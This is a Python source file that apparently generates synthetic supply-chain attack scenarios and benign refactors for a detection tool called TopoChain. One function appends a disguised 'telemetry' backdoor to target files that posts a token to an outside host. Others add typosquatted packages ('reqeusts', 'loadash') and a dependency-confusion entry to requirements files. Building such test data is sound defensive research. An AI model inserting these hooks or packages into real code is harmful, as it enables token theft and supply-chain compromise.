"""
Synthetic supply chain attack generators and benign mutation engines for TopoChain.
Creates realistic repository evolution scenarios: benign refactors, logic backdoors, and typosquatting.
"""

from pathlib import Path
from typing import Dict, List, Tuple, Any, Optional


class SyntheticAttackGenerator:
    """
    Generates synthetic supply chain attack scenarios and benign mutations on codebases.
    """

    @staticmethod
    def inject_subtle_logic_backdoor(file_path: str) -> bool:
        """
        Injects a subtle conditional backdoor hooking sensitive operations and forming a circular loop.
        Simulates: 'if (user == admin && secret_token == magic) leak_payload()'
        Creates an anomalous loop / edge between auth/user logic and external/system routines.
        """
        p = Path(file_path)
        if not p.exists():
            return False

        content = p.read_text(encoding="utf-8")

        backdoor_payload = '''

# --- TopoChain Synthetic Injected Hook ---
import os
import urllib.request

def _shadow_telemetry_dispatch(auth_context, token):
    """Hidden conditional bypass hook forming a topological loop."""
    if hasattr(auth_context, 'role') and auth_context.role == 'root_override':
        payload = f"EXFIL:{token}"
        try:
            urllib.request.urlopen("https://telemetry-sink.internal.net/sync", data=payload.encode())
        except Exception:
            pass
        # Recursive feedback call forming topological H_1 loop
        return handle_login("admin_backdoor", token)
    return False
'''
        # Inject the hook definition
        modified = content + backdoor_payload

        # Connect it into handle_login
        if "def " in content:
            lines = modified.splitlines()
            for idx, line in enumerate(lines):
                if line.startswith("def ") and "def _shadow" not in line:
                    indent = "    "
                    hook_call = f"{indent}_shadow_telemetry_dispatch(locals().get('user'), 'session_ctx')"
                    lines.insert(idx + 1, hook_call)
                    break
            modified = "\n".join(lines)

        p.write_text(modified, encoding="utf-8")
        return True

    @staticmethod
    def inject_typosquatting_dependency(repo_dir: str) -> bool:
        """
        Injects a typosquatted package into requirements.txt or package.json
        e.g., 'cryptography' -> 'crypt0graphy' or 'reqeusts'
        """
        base = Path(repo_dir)
        req_file = base / "requirements.txt"
        if req_file.exists():
            content = req_file.read_text(encoding="utf-8")
            content += "\nreqeusts>=2.28.0\n"
            req_file.write_text(content, encoding="utf-8")
            return True

        pkg_json = base / "package.json"
        if pkg_json.exists():
            import json
            try:
                data = json.loads(pkg_json.read_text(encoding="utf-8"))
                deps = data.get("dependencies", {})
                deps["loadash"] = "^4.17.21"
                data["dependencies"] = deps
                pkg_json.write_text(json.dumps(data, indent=2), encoding="utf-8")
                return True
            except Exception:
                pass

        req_file.write_text("reqeusts>=2.28.0\n", encoding="utf-8")
        return True

    @staticmethod
    def inject_dependency_confusion(repo_dir: str, internal_name: str = "corp-internal-auth") -> bool:
        base = Path(repo_dir)
        req_file = base / "requirements.txt"
        content = req_file.read_text(encoding="utf-8") if req_file.exists() else ""
        content += f"\n{internal_name}==1.0.9\n"
        req_file.write_text(content, encoding="utf-8")
        return True

    @staticmethod
    def apply_benign_refactor(file_path: str) -> bool:
        """
        Performs safe refactoring that preserves topological homotopy:
        - Renaming variables
        - Adding type hints / docstrings
        - Reformatting whitespace
        - Adding a pure mathematical helper function
        """
        p = Path(file_path)
        if not p.exists():
            return False

        content = p.read_text(encoding="utf-8")

        refactor_addition = '''

def _sanitize_string_input(val: str) -> str:
    """Benign refactored helper for string normalization."""
    if not isinstance(val, str):
        return str(val)
    return val.strip().lower()
'''
        modified = '"""Updated module documentation with enhanced typing guidelines."""\n' + content + refactor_addition
        p.write_text(modified, encoding="utf-8")
        return True
